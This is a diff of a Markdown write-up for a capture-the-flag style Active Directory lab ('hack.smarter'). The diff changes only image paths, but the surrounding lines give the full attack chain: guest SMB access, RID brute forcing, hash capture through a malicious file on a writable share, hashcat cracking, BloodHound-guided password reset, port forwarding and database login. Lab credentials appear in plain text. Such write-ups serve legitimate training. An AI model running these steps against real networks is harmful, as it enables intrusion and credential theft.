@@ -125,7 +125,7 @@ nxc smb hack.smarter -u '' -p ''
 nxc smb hack.smarter -u 'guest' -p ''
 ```
 
-![image.png](<../.gitbook/assets/image (8).png>)
+![image.png](<../../.gitbook/assets/image (8).png>)
 
 * **Null Session Success:** The first command `nxc smb hack.smarter -u '' -p ''` shows that the server accepts a connection with a completely blank username and password.
 * **Guest Account Access:** The second command `-u 'guest' -p ''` confirms that the built-in `Guest` account is active and has no password.
@@ -137,7 +137,7 @@ nxc smb hack.smarter -u 'guest' -p '' --shares
 
 ```
 
-![image.png](<../.gitbook/assets/image 1 (7).png>)
+![image.png](<../../.gitbook/assets/image 1 (7).png>)
 
 * **`Share` (READ, WRITE):** This is your primary target. The fact that a Guest account has **WRITE** access is a major security misconfiguration. This allows for data exfiltration, malware hosting, or potentially poisoning files that other users might execute.
 
@@ -147,7 +147,7 @@ nxc smb hack.smarter -u 'guest' -p '' --shares
 nxc smb 10.1.58.24 -u 'guest' -p '' --users
 ```
 
-![image.png](<../.gitbook/assets/image 2 (7).png>)
+![image.png](<../../.gitbook/assets/image 2 (7).png>)
 
 Enumerate Users - Rid Brute Forcing
 
@@ -155,14 +155,14 @@ Enumerate Users - Rid Brute Forcing
 nxc smb 10.1.58.24 -u 'guest' -p '' --rid-brute
 ```
 
-![image.png](<../.gitbook/assets/image 3 (7).png>)
+![image.png](<../../.gitbook/assets/image 3 (7).png>)
 
 ```bash
 nxc smb 10.1.58.24 -u 'guest' -p '' --rid-brute | grep  "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' 
 
 ```
 
-![image.png](<../.gitbook/assets/image 4 (7).png>)
+![image.png](<../../.gitbook/assets/image 4 (7).png>)
 
 Enumerating valid Usernames
 
@@ -170,15 +170,15 @@ Enumerating valid Usernames
 kerbrute userenum --dc DC01.hack.smarter -d hack.smarter usernames.txt
 ```
 
-![image.png](<../.gitbook/assets/image 5 (7).png>)
+![image.png](<../../.gitbook/assets/image 5 (7).png>)
 
 * all the usernames are valid
 
 Shares
 
-![image.png](<../.gitbook/assets/image 1 (7).png>)
+![image.png](<../../.gitbook/assets/image 1 (7).png>)
 
-![image.png](<../.gitbook/assets/image 7 (7).png>)
+![image.png](<../../.gitbook/assets/image 7 (7).png>)
 
 * We were able to authenticate and the share is empty..
 * If we have access to a share with `write permissions`, we can put there a malicious file. On the other end we can have responder to catch the hash.
@@ -195,7 +195,7 @@ Shares
     smbclient \\\\10.1.58.24\\Share -U guest
     ```
 
-    ![image.png](<../.gitbook/assets/image 8 (6).png>)
+    ![image.png](<../../.gitbook/assets/image 8 (6).png>)
 
 OR
 
@@ -213,7 +213,7 @@ sudo python3 SMB_Killer.py -r 10.1.58.24 -l 10.200.39.91 -d hack.smarter -i tun0
 
 ```
 
-![image.png](<../.gitbook/assets/image 9 (7).png>)
+![image.png](<../../.gitbook/assets/image 9 (7).png>)
 
 Cracking the hash
 
@@ -222,9 +222,9 @@ hashcat -m 5600 -a0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ```
 
-![image.png](<../.gitbook/assets/image 10 (7).png>)
+![image.png](<../../.gitbook/assets/image 10 (7).png>)
 
-![image.png](<../.gitbook/assets/image 11 (7).png>)
+![image.png](<../../.gitbook/assets/image 11 (7).png>)
 
 ```bash
 bob.ross:137Passowrd123!@#
@@ -236,7 +236,7 @@ bob.ross:137Passowrd123!@#
 nxc smb hack.smarter -u bob.ross -p '137Password123!@#'
 ```
 
-![image.png](<../.gitbook/assets/image 12 (7).png>)
+![image.png](<../../.gitbook/assets/image 12 (7).png>)
 
 * Valid Creds
 
@@ -248,16 +248,16 @@ We can use the provided creds `faraday:hacksmarter123` to obtain the loot
 nxc ldap DC01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.58.24 
 ```
 
-![image.png](<../.gitbook/assets/image 13 (7).png>)
+![image.png](<../../.gitbook/assets/image 13 (7).png>)
 
 #### BloodHound Enumeration
 
-![image.png](<../.gitbook/assets/image 14 (7).png>)
+![image.png](<../../.gitbook/assets/image 14 (7).png>)
 
 * The user BOB.ROSS@HACK.SMARTER has GenericAll permissions to the user ALICE.WONDERLAND@HACK.SMARTER.
 * This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.
 
-![image.png](<../.gitbook/assets/image 15 (5).png>)
+![image.png](<../../.gitbook/assets/image 15 (5).png>)
 
 * The user ALICE.WONDERLAND@HACK.SMARTER is a member of the group REMOTE MANAGEMENT USERS@HACK.SMARTER.
 
@@ -266,7 +266,7 @@ nxc ldap DC01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --c
 * Change Alice. wonderland password https://github.com/lineeralgebra/autobloodyAD?tab=readme-ov-file
 * Connect to remote management with Alice
 
-![image.png](<../.gitbook/assets/image 16 (5).png>)
+![image.png](<../../.gitbook/assets/image 16 (5).png>)
 
 ### User - Flag
 
@@ -274,15 +274,15 @@ nxc ldap DC01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --c
 Get-ChildItem -Path C:\ -Include 'user.txt' -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName) ==="; Get-Content -Raw -Encoding UTF8 $_.FullName }
 ```
 
-![image.png](<../.gitbook/assets/image 17 (6).png>)
+![image.png](<../../.gitbook/assets/image 17 (6).png>)
 
 ### Priveledge Escalation
 
-![image.png](<../.gitbook/assets/image 18 (4).png>)
+![image.png](<../../.gitbook/assets/image 18 (4).png>)
 
 * Since Tyler is in the All Domain Admin group , we need to find a way to do a lateral movement to become him.
 
-![image.png](<../.gitbook/assets/image 19 (6).png>)
+![image.png](<../../.gitbook/assets/image 19 (6).png>)
 
 * Permission was denied to perform anything with tyler
 
@@ -294,12 +294,12 @@ net user alice.wonderland
 ls -Force
 ```
 
-![image.png](<../.gitbook/assets/image 20 (5).png>)
+![image.png](<../../.gitbook/assets/image 20 (5).png>)
 
 * Nothing too interesting here.
 * We can use a tool called `winpeas` but before that i like going to `C:\` and force for hidden items.
 
-![image.png](<../.gitbook/assets/image 21 (6).png>)
+![image.png](<../../.gitbook/assets/image 21 (6).png>)
 
 * The most interesting item in that list is the **`SQL2019`** directory.
 * The SQL port was not accessible outside. We can conclude that it internal facing.
@@ -311,7 +311,7 @@ Check the permissions of that folder immediately to see if you can modify it
 icacls C:\SQL2019
 ```
 
-![image.png](<../.gitbook/assets/image 22 (6).png>)
+![image.png](<../../.gitbook/assets/image 22 (6).png>)
 
 * Access denied
 
@@ -321,7 +321,7 @@ Check to see the running processes / Listening port (MSSQL-1433)
 netstat -ano | findstr LISTENING
 ```
 
-![image.png](<../.gitbook/assets/image 23 (6).png>)
+![image.png](<../../.gitbook/assets/image 23 (6).png>)
 
 * The standard SQL port (**1433**) is bound to `127.0.0.1` (localhost), not `0.0.0.0` or the external IP. This means you cannot reach this database from your Kali machine; you can only interact with it from within your current shell as Alice.
 *   We need to use Ligolo-ng for port forwarding.
@@ -345,17 +345,17 @@ netstat -ano | findstr LISTENING
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 24 (6).png>)
+    ![image.png](<../../.gitbook/assets/image 24 (6).png>)
 
-    ![image.png](<../.gitbook/assets/image 25 (6).png>)
+    ![image.png](<../../.gitbook/assets/image 25 (6).png>)
 
-    ![image.png](<../.gitbook/assets/image 26 (6).png>)
+    ![image.png](<../../.gitbook/assets/image 26 (6).png>)
 
 #### Accessing the Database
 
 Now, the agent is listening on its Ethernet IP (`10.1.58.24`) on port 1433 and forwarding it to its own localhost. Since you have a route to `10.1.58.24` via the `ligolo` interface, you can target the agent's internal IP directly from your machine.
 
-![image.png](<../.gitbook/assets/image 27 (5).png>)
+![image.png](<../../.gitbook/assets/image 27 (5).png>)
 
 ```bash
 impacket-mssqlclient alice.wonderland:RedBlue777@10.1.58.24
